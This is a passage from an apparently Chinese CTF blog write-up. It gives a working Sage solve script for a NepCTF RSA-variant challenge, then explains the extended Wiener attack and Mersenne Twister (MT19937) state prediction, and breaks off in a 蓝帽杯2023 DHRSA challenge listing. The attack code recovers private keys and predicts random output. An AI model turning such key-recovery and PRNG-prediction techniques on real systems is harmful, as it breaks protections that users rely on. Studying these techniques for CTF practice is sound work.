up</h4><p>事实上比赛时我对<strong>MT19937</strong>和<strong>拓展维纳攻击</strong>的分析是正确的</p><p>可惜没去查论文</p><p>因为这题的涉及到<strong>变种RSA扩展维纳攻击</strong></p><p>MT19937攻击使用python库<strong>extend_mt19937_predictor</strong>即可</p><p>本题完整sage脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd,next_prime,invert,iroot</span><br><span class="line"><span class="keyword">from</span> extend_mt19937_predictor <span class="keyword">import</span> ExtendMT19937Predictor</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor_N_with_e</span>(<span class="params">n,e</span>):</span><br><span class="line">    convergents = continued_fraction(ZZ(e) / ZZ(<span class="built_in">int</span>(n^<span class="number">2</span> -<span class="number">9</span>/<span class="number">4</span>*n +<span class="number">1</span>))).convergents()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> convergents:</span><br><span class="line">        k = c.numerator()</span><br><span class="line">        d = c.denominator()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">2</span>,<span class="built_in">int</span>(e),<span class="built_in">int</span>(n)),<span class="built_in">int</span>(d),n) == <span class="number">2</span>:</span><br><span class="line">            phi = (e*d - <span class="number">1</span>)//k</span><br><span class="line">            p_add_q = iroot(n^<span class="number">2</span>+<span class="number">1</span> -phi +<span class="number">2</span>*n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">            p_sub_q = iroot(n^<span class="number">2</span>+<span class="number">1</span> -phi -<span class="number">2</span>*n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">            p = (p_add_q + p_sub_q)//<span class="number">2</span></span><br><span class="line">            q = n//p </span><br><span class="line">            <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line">Ns=[]</span><br><span class="line">es=[]</span><br><span class="line">Ns.append(<span class="number">22537824826661390223424247613988068034762851961157584494237475399272684698931837582845353300058708376928066803405952833371270343886811582482596041025703562011290683776244440183058564931536167588068982985446423691731289919792182527017708444670021961040693402133847603155628894661303844045174158892135246551752887296981551783741194429738125411950353273196689940793799918342870149922450137468917079363770653597792198995114960248957648399949770607031773274269305508205502788420176566800613727078909046810965678172896900712370390242747304193464562017569375391573425033201518897326268974895428864607294404834217486889626067</span>)</span><br><span class="line">es.append(<span class="number">138734597932681432146593418071500104975097303947235094754561455609462297555431740773778233199030836536181432380163420879026102996000812679067503821183989703625007081183136453867034603133623214624347743902763056646758303457573028872281836337816161325620419859404564303343891497751416698105376363608315824345809065611898005422541630568343931058614508204741013188215685621271052482911000416811907896612076443855215829082314173006789532402139226514279369930916581792561410304609979179181212657266021728705826301323934157434591614855280547917537852436113654407688546561597461431646587315004899280385693864467900922100139871785655120697706496224116446681145092889309317515443325835174244973690025382177377962932105743284683009382320913496757661606711346067741870427773815722572964498484063351551391418412838281736894948235137587183065029215731250865241317657697517413333042995868451419526992362575295353213512321908674676945279408691460555734014052988319778462382048778709139419333524385417952528530366999004891284914825847790181862255603834009637969575260079574396804250215455740325558291131627689579437078295278863294097845252667171535763807924168498127261282731290505289608262179438124625649642636182083776300283319289915374624961712653</span>)</span><br><span class="line"></span><br><span class="line">Ns.append(<span class="number">6274546339544888768644789843311419134818004096768603845365518977306935493052521497519175028089437236761423867823262516191490597273908631998081154618285312153434770073720976098867396742471680890293254752267605499255169326711848016278766753778762031405366921683792056789407853305249437106982348618425021256460636482851698435376389919364204769613192430479123706318293585495289879180851132554973818815070788262098611224093020341849237428117879027244911203346180853298544223713486928469372908721392827684780137693677209345445942919962990053250395024484583187421075440641480216037229722393785452525034345237210128057575471</span>)</span><br><span class="line">es.append(<span class="number">6816229639274112360127375160129976283803780671835649464662216953274788670298119581490308251091527765523862793876248484976964516014521928193402406674543559617331132672377525907986916620128585686125738095495763839466668090496434574665174465481239266885391258338614183207608126631709820109879956875736614878909323605565935381337508623639537061259891127144542904865315473351573299736626413254743748115425609364728057333519641010517774252868076778182331567470953952498350730833750070954728558468762716771017777706375771619651064685534393033318515482257223763229174514686211337316905863509879412175617527218834684703000403031425463770536830127898992834855679772246235520604090201191704944952028218549992251035280635917847240965148800849625354939856660848785382830964868230182487528332536748623696072982084155943005225059557342296182817587500114794828507381124146190353878908176849950890467106544577637908359501063238750187093982399537914521258266082734645849446560162705750663487079882805604564517075915685197992097212331440571415385599231910976013688951015114926830356741094239761437270621663346419901696795850688564776378820503827041193837318548510119014302810053953658676697019697630188625116410092169127152796058863748764013682497939</span>)</span><br><span class="line"></span><br><span class="line">Ns.append(<span class="number">7033242934313911617915370463753973061696207288498842695764035487588917876242440540290488008869797904974691714697721721283947971355999106035289016138345801910133073068174108170229491675603212395933924016278358008639554322624843932897396960609189051209643497519694057494944289167537022332119761934070861532451907286657700650146806555444747940730420147901212379535719653643484173080079172941837018636441478229515012901998513559519866730685829684707622706175764190994709063196495343830929136973633289340950272653728043308354240012161431695518275611578691206149580893537585370503416436231040785800664617370845457636507373</span>)</span><br><span class="line">es.append(<span class="number">40741835840719057027068319492970583470528881382803716418364653870080058622156909377738185420827467314413512511492397920252164414117956834276649844216914404018920028811630177722875369807281893530197017252963630372370374747148813182542589995731838473868063073754954223509497830267809800926245205430476741139619912913673282788675304357813092521700071091744825240512494990728254527083377716674388696819784313808339878265621192173538020777314766219688491638667567106959131093575346705953518495833259604515597325271001238649465380577080494672991745328792235370276741154715574780192691254866861858895341850694654596225740569111073008359702667896467205706781036648628893475072715410255037942273267206315235983153223008531618610230257086119285886173157484398906439752068495678556357613795791467066810705197121410350568328793810636815141728035779662700816654743489502219781077759760073393120940600454699774737362141583979261402813400146968416902616192346695791038404476286201688240239025132255687828236074960774939024752010058639702283427958154036115595796747847178223186808400212601781457541710579621507634949928138998458710132991536600694493869256759751952918863741648153998280321586670085877464297833501428147851192475762142481144210374729</span>)</span><br><span class="line"></span><br><span class="line">Ns.append(<span class="number">5515220884021336970862275167937432706774086760307345493758355407082611881687417106041988561159707722043326906871782788179830793948626803415269881180057295971488161156406028310765335645191428913247696931231456149936758576038023948926465001362260538823507280619462580966749698141504616966770774464155308261944306936232188699464903857962214868960712031476255910121174209368035150601980593184875627393772346196517700195653925532105502535054739699193987090827673963909885997488402164076254118140966268626515017282801146838949997254682432624148069106412023256666757294808355473524248706584183253743746190667825344090735507</span>)</span><br><span class="line">es.append(<span class="number">27545943436008205192466392146312275350052102340430590890066877373758488661449966774264552635128283215901820155231852994114772623236202481567239435535874760075504493562802626826291928384929323141604652686825513232209696424056756056541825020640169349125845012860406119215734155235823894038092632924099305318778218652782677929386981577810863948946016157839892403075950672327144434254914185650678383059840146557984115295339556244196605497494527019904188910500861412232834797080022272944616867030441521591763706703002065878450561713457527825688019967574810777811525255417243854717475915696113904995939128551197394619709767245589535610868051403872023084015959957890496719349590202804330300807904240587346054105871805966443483086940518302471177065206963143195767481445443418680777155432537987693729107638243548705745742678482316001891443966000174798210175352044800967369982858441628494534591240045812587764064373766987145633774419795741123588607411147213782886833718361722110440999096835034976152742315282032748045708702842770686418432412624392434147272156772744489786263382751791372640135423212833649821848146145001585638446209712930087341278823672429673683111970980096308606491748867960268649616693094935181469752524997580584805349947123</span>)</span><br><span class="line"></span><br><span class="line">Ns.append(<span class="number">707553297879923177356335146532069623604428585457029141654099064083758325344279627925920242519099318326658381470467974653239791175600875958131324367593537709893757926812352231940885134981358322400240925105397807784118834519851991635527957423795609390852936897290132734999038988026169418881785178960809515864390576812740883128033281324731111796202403861022853438825679072942969660472810765800934597235296834952521633103134547244231864541397925943463303930419782291345864716578886463639342118925306182423459228179791865664561840052927559355777744624399481245874427367436123249916802781395498558815808117816153851090809</span>)</span><br><span class="line">es.append(<span class="number">476835325934189547836292777026041023371148571156463962012880958757944085399758738205283286399334722871894505046090766077229508600863632592015531531628092534860787027986660362296593590421952597122675521182585430259524898100255109700079833179961062981203497736752842526581854959840861895967740417318894425795071380577844789103318524725820756481753291260159826108893063109122213128545709370987322299362649554540926858127317326803313301356181179057881338863137280346277075415080842612942892560322933543217284701560108922901787612676458288276321967842403370403729030083964189266042501688426026969035742389856235451962236823285702151842172397039927227613155422065105587425258233562606059105631111048246890263847875100561204728076387995554893554018520146391083332662983471855734865236713621339367638774664903571940938222768477809946896904342352640218457067049228700063560561986208213880901466761766658005909132289894836214335025796250817129190015222343382401433477141447507445689525537850173095088031348312523535651644177815593848154982006431125144136434640061160594700287452918506662927231440240394313973842561113424179351101333205521687471664502208193453348226748463761211023487451484937024753345544403740598530714590979500824361898349</span>)</span><br><span class="line"></span><br><span class="line">Ns.append(<span class="number">1174140632671015958261680882885689282089461375073396795698409666883472485597284663141211586467308831657514141409046557743901220588742234762871975650828276609892436013463956505148941718047758019452108677333838067737690070001391918566731891662155223281759699605140519220454976428865373529394744215204895977525725731538112915575334028817210061259374241384161149774887685139129929524748236393300647250180543352420479715186567359381371734233117769316250064423204561965836088727262981245272806674341083098416951592697842269090172337779893183460941187775737310053977539420950749247856094432739662593564239070582498797381009</span>)</span><br><span class="line">es.append(<span class="number">825353942467438234491111084516936797128140027203784474891798800414336605361414186661583004143257383201569203822551344974068949165344273763876615373043877527773093928960467215872693727816191117465919988153853161000881030542114914941352759498799545196523052122861955253519302407772691186951213308450636061291872775729603561683435521768308933690835080550772642833337817896300004822744605680361933350735805267937934286244922586652389425557655335013436726671473028595770338968627940302482280711760107774414537585937863168754668453885061204249986101071167028988095045568258441130714118233523745169679090945421590869375509998154504396878014511907888539167694131925238588859598725184662191826531994202286022429433690565056627911001834268776824700846906219148406027748395811448518747553045711021410331182717382379956168706606051002858514214330540368543514307421082375954175404302844792700585694756351868096269476974857475405543355119725892926139966042877395445749171112669690253373756673197045102745144246028153147601058742572746575386811945290093484519058179624368946654749995012889984471094647410670938250873437031330589096177392536521956944850884417890645930238421186410678500251283295562754926225650213865444544000297930194777658433889</span>)</span><br><span class="line"></span><br><span class="line">Ns.append(<span class="number">6276624371571322127032717528988403355942748255487183219267886395660971429723684209001382203088006753614931749563754635436959672532470203173873966609604425233662748651974072780833472364097044853853352453104215290154805673093406690509685785395377452785503947795433224239515836453030100902644138118585267917947442229874047104299588820831133871052908583498858437224506062430779962591008533689175035855935205810375775549031261102987287032561315490868731527768409029395091316808354032134723564697369468445597956717874050607045073658705017638915547090694446609245551301975852518033673640951339784531542368356313947923717367</span>)</span><br><span class="line">es.append(<span class="number">4834448583556238562695333814669633473578395694994823308285848875447286856609545266763235079125953453630747057984939339519480845072027717047444425002584145597569095137335784562707662997300157488660880747910032450465764286421150106071387112517350098642033395129426783691267842349041299351180374740785056277266915618733246024742289334731264695226009208450387864801281044160267289921056725461400497169893204466841683255565774720703277610021920414649471524369642392114034753099895659454683133776017380599332734563716104395584378176004067527173821613141103789428693603220181387443973578566586053743228232089818664884161874519177760253682885066533216475221265861892995346645326152399587288537613784309794325645046905177498808889470249663668654810130597749775576909495987678548653910285369470549673317992925013277276466958694013901591757010380010612703667696761086495736918715214768477207011152740334849526812828915367533869104564994266525693597782393511548424817920580128787463341705437149065550280692381207426443987434943692728197680277851234773705473049444481734019328425281093760302507469963769149697884104863580140750939967048592895251133501980796441364382320329398348046615652832468150610453087912158467236578469248525561624767339227</span>)</span><br><span class="line"></span><br><span class="line">random_number = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    p,q = factor_N_with_e(<span class="built_in">int</span>(Ns[i]),<span class="built_in">int</span>(es[i]))</span><br><span class="line">    <span class="keyword">if</span> p &gt; q:</span><br><span class="line">        random_number.append((p&gt;&gt;<span class="number">32</span>,<span class="number">1024</span>-<span class="number">32</span>))</span><br><span class="line">        random_number.append((q&gt;&gt;<span class="number">32</span>,<span class="number">1024</span>-<span class="number">32</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        random_number.append((q&gt;&gt;<span class="number">32</span>,<span class="number">1024</span>-<span class="number">32</span>))</span><br><span class="line">        random_number.append((p&gt;&gt;<span class="number">32</span>,<span class="number">1024</span>-<span class="number">32</span>))</span><br><span class="line">    d = <span class="built_in">int</span>(inverse_mod(es[i], (p*p-<span class="number">1</span>)*(q*q-<span class="number">1</span>)))</span><br><span class="line">    random_number.append((d&gt;&gt;<span class="number">32</span>,<span class="number">1024</span>-<span class="number">64</span>))</span><br><span class="line">bits = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen2</span>(<span class="params">bits: <span class="built_in">int</span></span>):</span><br><span class="line">    p = (predictor.predict_getrandbits(bits - <span class="number">32</span>) &lt;&lt; <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> next_prime(p)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="string">b&quot;\t\xb9d\x82@\xe1-\xaa\xff\x86\t\xb2\x0e\xe51\x1ek\xa0\xb5&#x27;\xc2:\x95\x9c\xfb\x9f\xf0I\x1f\x05&amp;\xf6\xfa\x99A\x1c\x00\xea\xcd\xa25\xb9=\xe4\x87L\\Q\x0f\xad#\xf3\x9fC\x93\xa3\x01\xc4\xc8\xc4\xf3\x88RM\x92\x95\x99\xa5\xf5e\x1dDs2\x8c\x8d\xc3\xb5#\xd9\x01Z\xa6\x92\x10\xb8g\x8a\n\xea\xf6\xd4\xfan\xba\xedZiLU.-D\x18\x9dif\xea1\x9dz8Z\x1e\x9a\x0c\xd8$S\xa3\xf2\xa7\xa3\x1b\xf9\xb9\x96\xfd\t&#125;\xd4Su8\xb5+\xde\xb7\xd3\xa4\xbaa_\x0f\xccj\x86\x8d\x91\x9aJ!Z|\xcf\xa9\xae\xb9\xfe\x15\xd8\x04\xa7:\x86\xe6\x1e\xdc\x88\xbd\x1a3\x99\xc3N~\x08\x04\x18(\x8dG\xa8\x86\xd3\x03\xceF4\xb2Xp\x17:-\x1a\x1f;.\xefd\xbf7p\xe1\xca\x8a\x97\xfa\xcf\x1es\x0f\x0fJ\x87\x16\x91\xd1l\x13\xcb&lt;\xe9\x8c\x8ai\x80\xec\xe8\xeb\x87\xee\xb0\xabR\xdc\xa8D\x7f+\xa9|,\xa5\xce\xce-\xec\x86]i\xa8\x82\x8b)&quot;</span></span><br><span class="line"><span class="keyword">for</span> sign <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1</span>&lt;&lt;<span class="number">7</span>)):</span><br><span class="line">    predictor = ExtendMT19937Predictor()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">if</span> (sign&gt;&gt;i)&amp;<span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            predictor.setrandbits(*random_number[<span class="number">3</span>*i])</span><br><span class="line">            predictor.setrandbits(*random_number[<span class="number">3</span>*i+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            predictor.setrandbits(*random_number[<span class="number">3</span>*i+<span class="number">1</span>])</span><br><span class="line">            predictor.setrandbits(*random_number[<span class="number">3</span>*i])</span><br><span class="line">        predictor.setrandbits(*random_number[<span class="number">3</span>*i+<span class="number">2</span>])</span><br><span class="line">    p,q = gen2(bits),gen2(bits)</span><br><span class="line">    phi = lcm(p-<span class="number">1</span>,q-<span class="number">1</span>)</span><br><span class="line">    d = invert(e,phi)</span><br><span class="line">    n = p*q</span><br><span class="line"></span><br><span class="line">    privateKey = RSA.construct((<span class="built_in">int</span>(n),<span class="built_in">int</span>(e),<span class="built_in">int</span>(d),<span class="built_in">int</span>(p),<span class="built_in">int</span>(q)))</span><br><span class="line">    Cipher = PKCS1_v1_5.new(privateKey)</span><br><span class="line">    flag = (Cipher.decrypt(c,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;NepCTF&#123;c4e4356067fb3bedc53dde7af59beb1c&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><h5 id="拓展维纳攻击"><a href="#拓展维纳攻击" class="headerlink" title="拓展维纳攻击"></a>拓展维纳攻击</h5><div class="note info flat"><p>论文地址：<a href="https://ro.uow.edu.au/cgi/viewcontent.cgi?article=6676&amp;context=eispapers">A new attack on three variants of the RSA cryptosystem</a></p><p><img src="/posts/25f6527726f2/image-20230829203932874.png" class="" title="image-20230829203932874"></p><p>sage脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factor_N_with_e</span>(<span class="params">n,e</span>):</span><br><span class="line">    convergents = continued_fraction(ZZ(e) / ZZ(<span class="built_in">int</span>(n^<span class="number">2</span> -<span class="number">9</span>/<span class="number">4</span>*n +<span class="number">1</span>))).convergents()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> convergents:</span><br><span class="line">        k = c.numerator()</span><br><span class="line">        d = c.denominator()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">2</span>,<span class="built_in">int</span>(e),<span class="built_in">int</span>(n)),<span class="built_in">int</span>(d),n) == <span class="number">2</span>:</span><br><span class="line">            phi = (e*d - <span class="number">1</span>)//k</span><br><span class="line">            p_add_q = iroot(n^<span class="number">2</span>+<span class="number">1</span> -phi +<span class="number">2</span>*n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">            p_sub_q = iroot(n^<span class="number">2</span>+<span class="number">1</span> -phi -<span class="number">2</span>*n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">            p = (p_add_q + p_sub_q)//<span class="number">2</span></span><br><span class="line">            q = n//p </span><br><span class="line">            <span class="keyword">return</span> p,q</span><br></pre></td></tr></table></figure></div><p>关于维纳攻击的详细内容后面会单独写一篇文章总结，因为在Crypto题中经常出现</p><h5 id="MT19937攻击"><a href="#MT19937攻击" class="headerlink" title="MT19937攻击"></a>MT19937攻击</h5><p><strong>概念</strong></p><div class="note info flat"><p><strong>梅森旋转算法</strong>（<strong>Mersenne twister</strong>）是一个伪随机数发生算法。由松本真和西村拓士在1997年开发，基于有限二进制字段上的矩阵线性递归。可以快速产生高质量的伪随机数，修正了古典随机数发生算法的很多缺陷。</p></div><p>Python中使用的梅森算法为MT19937，周期为$2^{19937}-1$</p><p>也就是说，其生成的数据在624*32后会达到循环，我们必须需要624个32位由梅森算法产生的随机数才能找到循环点，并以此预测之后的随机数</p><p><strong>工具</strong></p><p>较为好用的工具为python的库<strong>Extend_MT19937_Predictor</strong></p><p>下载：<code>pip install extend_mt19937_predictor</code></p><p>每次进行预测操作时，先定义一个predictor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> extend_mt19937_predictor <span class="keyword">import</span> ExtendMT19937Predictor</span><br><span class="line">predictor = ExtendMT19937Predictor()</span><br></pre></td></tr></table></figure><p>然后将数据喂给它，需要标明投喂数据的位数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">predictor.setrandbits(数据,位数)</span><br><span class="line"><span class="comment">#example</span></span><br><span class="line">predictor.setrandbits(random.getrandbits(<span class="number">256</span>), <span class="number">256</span>)</span><br></pre></td></tr></table></figure><p>当数据超过19938位之后，便可以进行预测以及回溯操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#预测操作，括号中注明预测的位数</span></span><br><span class="line">predictor.predict_getrandbits(<span class="number">64</span>)</span><br><span class="line"><span class="comment">#回溯操作，括号中注明预测的位数</span></span><br><span class="line">predictor.backtrack_getrandbits(<span class="number">64</span>)</span><br></pre></td></tr></table></figure><h2 id="蓝帽杯2023"><a href="#蓝帽杯2023" class="headerlink" title="蓝帽杯2023"></a>蓝帽杯2023</h2><h3 id="DHRSA"><a href="#DHRSA" class="headerlink" title="DHRSA"></a>DHRSA</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chall.py</span></span><br><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,getStrongPrime, isPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> r,g</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> r.bit_length() == <span class="number">512</span> <span class="keyword">and</span> isPrime(r)</span><br><span class="line">FLAG = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_DH_key</span>(<span class="params">g,r</span>):</span><br><span class="line">    x = randint(<span class="number">2</span>,r-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, <span class="built_in">pow</span>(g,x,r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_RSA_parameters</span>(<span class="params">g,r</span>):</span><br><span class="line">    main_key = gen_DH_key(g,r)</span><br><span class="line">    sub_key = gen_DH_key(g,r)</span><br><span class="line">    x, X = main_key</span><br><span class="line">    w, W = sub_key</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Public DH Keys <span class="subst">&#123; X = &#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Public DH Keys <span class="subst">&#123; W = &#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c, C = gen_DH_key(g,r)</span><br><span class="line">        t1 = randint(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">        t2 = randint(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">        p = ZZ(C * W^t1 * <span class="built_in">pow</span>(X, c, r) % r)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_prime(p):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        q = ZZ(<span class="built_in">pow</span>(W, -t2, r) * <span class="built_in">pow</span>(X, -c, r) % r)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_prime(q):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Try <span class="subst">&#123;c ,C&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> p,q</span><br><span class="line">    </span><br><span class="line">p, q = gen_RSA_parameters(g,r)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(FLAG,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123; c = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123; n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># out.txt</span></span><br><span class="line">[+] Public DH Keys  X = <span class="number">197551296081022143608034360606381334253374533627365455002683616928330857539205836504075700389569213696043700490195977045586318090211726350917451410932216</span></span><br><span class="line">[+] Public DH Keys  W = <span class="number">10625560347436147537644301075885059900758953251551866239435327407977591190018531918316486861730777808988185029637608372445416280896280058313924537678128258</span></span><br><span class="line">[+] Try (<span class="number">9771395973011655803041049350400889693558053786906788399593857181577256033087775470396528142785531153656250742163382306394790826547696369519066900832598632</span>, <span class="number">8139606023160038223737079478941118590185130735073983268534523900466799026361464500424904356248753891316780445417573842978538788878976916399246204378441056</span>)</span><br><span class="line">[+] Try (<span class="number">8272821018041191335817314516024870641634584838709754134295649414123178842937800314505950304166260273130361466329869880024580711311122266329063823157928578</span>, <span class="number">6731047210123888962354325580924677204725121336252367061814596228770531939085170702108835833376855510135160514592212524395740859425722612967050674897558554</span>)</span><br><span class="line">[+] Try (<span class="number">9224196545381524434689958500941052085722509493323098161219607220849299786695264643219965900283680542442505315754998495711744726427299710433730839117822341</span>, <span class="number">8618477079542034439812499299348172601780082410118486479357089433765711733400709574657418048464225715724091467457454996920521245517408697962287328781660172</span>)</span><br><span class="line">[+] Try (<span 